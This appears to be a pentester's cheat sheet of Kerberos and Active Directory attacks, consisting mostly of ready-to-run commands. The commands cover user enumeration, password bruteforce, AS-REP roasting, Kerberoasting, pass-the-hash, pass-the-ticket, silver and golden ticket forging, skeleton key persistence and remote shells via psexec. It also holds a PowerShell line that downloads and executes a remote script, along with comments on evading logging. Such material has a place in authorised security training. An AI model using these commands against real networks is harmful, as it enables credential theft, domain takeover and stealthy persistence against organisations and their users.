# Kerberos
# Reference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting

# Main Attacks
- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required
- Constrained Delegation
- Unconstrained Delegation - Allows to retrieve tickets


# We can enumerate users from a kerberos domain controller
# We will need to supply a list of usernames to test, but since we are only
# querying the DC and not authenticating it, this activity is generally 
# not detected.
# NOTE: For many attacks it is better that our time is in sync
# with the clock of the KDC (this is shown by nmap)
# we can sync it by using rdate

# Tools:

# [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute)
# [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module
# [Rubeus](https://github.com/GhostPack/Rubeus)
# [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
# [Impacket](https://github.com/SecureAuthCorp/impacket)
# [Mimikatz](https://github.com/gentilkiwi/mimikatz)
# [Rubeus](https://github.com/GhostPack/Rubeus)
# [Rubeus](https://github.com/Zer1t0/Rubeus) with brute module
# [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
# [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute)
# [tickey](https://github.com/TarlogicSecurity/tickey)
# [ticket_converter.py](https://github.com/Zer1t0/ticket_converter)

# Sync time with domain controller
rdate -n <domain controller>

# Kerberos User Enumeration (nmap)
nmap -p 88 --script=krb5-enum-users \
    --script-args krb5-enum-users.realm='myforest.local',\
    userdb=/usr/share/seclists/Usernames/Names/names.txt \
    10.10.10.52

nmap <DomainControllerIP> -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='myforest.local'

# Bruteforce

We can try to bruteforce domain users by bruteforcing kerberos.  Note that
bruteforcing users on kerberos is much more stealthier wrt bruteforcing
users through SMB. In fact, by default these kerberos authentication
attempts are not logged by default.  In addition, it is also way faster
wrt SMB, since connection overhead is smaller. The fastest tool to bruteforce
on kerberos is at the moment (fall 2020) kerbrute.

## Kerberos Bruteforce (kerbrute)
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>

## Kerberos Bruteforce (Rubeus)
;; Bruteforce passwords with a list of users (should not require password)
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

;; Bruteforce passwords for all users in the current domain (may require password)
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>


# ASREPRoast

## ASREPRoast (Impacket)
;; check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

;; check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
;; examople
GetNPUsers.py spookysec.local/ -dc-ip 10.10.111.242  -usersfile users.txt -format hashcat -outputfile asrep.txt

## ASREPRoast (Rubeus)
;; check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>

### ASREPRoast Cracking with dictionary of passwords
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
;; 18200 is the type of hash got with Kerberos 5 AS-REP etype 23 packets
;; Note that this is different from the hash type we use for Kerberoasting
;; or
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
;; but generally is automatically detected
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Kerberoasting

## Kerberoasting (Impacket) GetUserSPNs.py:
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
;; or
python GetUserSPNs.py -request -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/fsmith
;; or
python GetUserSPNs.py -request -dc-ip 10.10.10.175 domainname
;; or
python GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.160.146 -request -outputfile tgs_hashes.txt

;; or
python GetUserSPNs.py <account_name/svc_tgs> -dc-ip <ip_address_of_dc> -request
;; notice that the <account_name/sc_tgs> is the string we found
;; in the Groups.xml file under the field `UserName` so we can just copy/paste
;; -dc-ip is the IP address of the domain controller
;; -request is used to request the ticket
;; Notice that a password will be asked, and if we have access to
;; `Groups.xml` we should provide as password the output of `gpp-decrypt` of the cPassword 


## Kerberoasting (Rubeus)
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>

## Kerberoasting (Powershell)
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>

### Cracking with dictionary
Cracking with dictionary of passwords:
hashcat -m 13100 --force <TGSs_file> <passwords_file> -o results.txt
;; or
hashcat -m 13100 kerberoast.txt rockyou.txt -o results.txt
;; or
john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>


# Overpass The Hash/Pass The Key (PTK)

## Overpass The Hash/Pass The Key (PTK) (Impacket)
;; Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>

;; Request the TGT with aesKey (more secure encryption, probably more stealth since it is the used by default by Microsoft)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>

;; Request the TGT with password
python getTGT.py <domain_name>/<user_name>:[password]
;; if the password is not provided, then it is asked

;; Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

# Execute remote commands with any of the following by using the TGT Ticket
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

# Ask for a ticket from NTLM hash and inject in memory
;; Ask and inject the ticket
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\<remote_hostname> cmd


# Pass The Ticket (PTT)

## Harvest tickets from Linux

;; Check type and location of tickets
grep default_ccache_name /etc/krb5.conf

;; If none return, default is FILE:/tmp/krb5cc_%{uid}.
;; In case of file tickets, you can copy-paste (if you have permissions) for use them.
;; In case of being *KEYRING* tickets, you can use [tickey](https://github.com/TarlogicSecurity/tickey) to get them:

;; Dump current user tickets, if root, try to dump them all by injecting in other user processes
cp tickey /tmp/tickey ;; to inject, copy tickey in a reachable folder by all users
/tmp/tickey -i

## Harvest tickets from Windows

With mimikatz
mimikatz # sekurlsa::tickets /export

With Rubeus
.\Rubeus dump

;; After dump with Rubeus tickets in base64, to write the tickets in a file
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>"))

;; To convert tickets between Linux/Windows format with ticket_converter.py:
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi


### Using tickets in Linux
With Impacket
;; Set the ticket for impacket use
export KRB5CCNAME=<TGT_ccache_file_path>

### Using tickets in Linux: Execute remote commands by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass


### Using tickets in Windows

Inject ticket with [Mimikatz](https://github.com/gentilkiwi/mimikatz):
mimikatz # kerberos::ptt <ticket_kirbi_file>

Inject ticket with Rubeus:
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>

### Using tickets in Windows: Execute a cmd in the remote machine with PsExec by using the TGT
.\PsExec.exe -accepteula \\<remote_hostname> cmd


# Silver Ticket

## Silver Ticket (Impacket)
;; To generate the TGS with NTLM
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
;; iirc the user_name is the user for which we create the ticket to access the service

;; To generate the TGS with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

;; Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

;; Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass


## Silver Ticket (Mimikatz)
;; To generate the TGS with NTLM
mimikatz 
> privilege::debug
> kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
;; iirc the /user is the user for which we create silver the ticket to access the service

;; To generate the TGS with AES 128 key
mimikatz
> privilege::debug
> kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

;; To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz
> kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

;; Inject TGS with Mimikatz
mimikatz
> kerberos::ptt <ticket_kirbi_file>

;; Inject ticket with Rubeus:
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>

;; Execute a cmd in the remote machine with PsExec:
.\PsExec.exe -accepteula \\<remote_hostname> cmd


# Golden Ticket

## Golden Ticket (Impacket)
;; To generate the TGT with NTLM
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

;; To generate the TGT with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

;; Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

;; Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass


## Golden Ticket (Mimikatz)
;; To generate the TGT ticket with NTLM
mimikatz 
> kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>

;; To generate the TGT ticket with AES 128 key
mimikatz 
> kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>

;; To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz 
> kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>

;; Inject TGT ticket with Mimikatz
mimikatz
> kerberos::ptt <ticket_kirbi_file>

;;# Inject TGT ticket with Rubeus
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>

;; Execute a cmd in the remote machine with PsExec
.\PsExec.exe -accepteula \\<remote_hostname> cmd


# Skeleton Key
mimikatz (as a domain admin)
> privilege::debug
> misc::skeleton

The default credentials of the hidden account will be: "mimikatz".

Examples:
;; The share will now be accessible without the need for the Administrators password:
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz 

;; Access the directory of Desktop-1 without ever knowing what users have access to Desktop-1:
example: dir \\Desktop-1\c$ /user:Machine1 mimikatz 

The skeleton key will not persist by itself because it runs in the memory,
it can be scripted or persisted using other tools and techniques.

# Unconstrained Delegation

This is very simple to exploit, we basically hunt for
machines with unconstrained delegation enabled and try to
access them, since they are a trove of tickets.

Take notes from here:
https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html

# Constrained Delegation

Take notes from here:
https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html

# Misc

## Get NTLM hash from password
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'

## Interacting with Kerberos
;; SetSPN is a native windows binary which can be used to retrieve the
;; mapping between user accounts and services. This utility can add, delete
;; or view SPN registrations.
setspn -T pentestlab -Q */*

## Show all service accounts
setspn.exe -q */*

## Show all MSSQL service accounts
setspn.exe -q MSSQLSvc/*

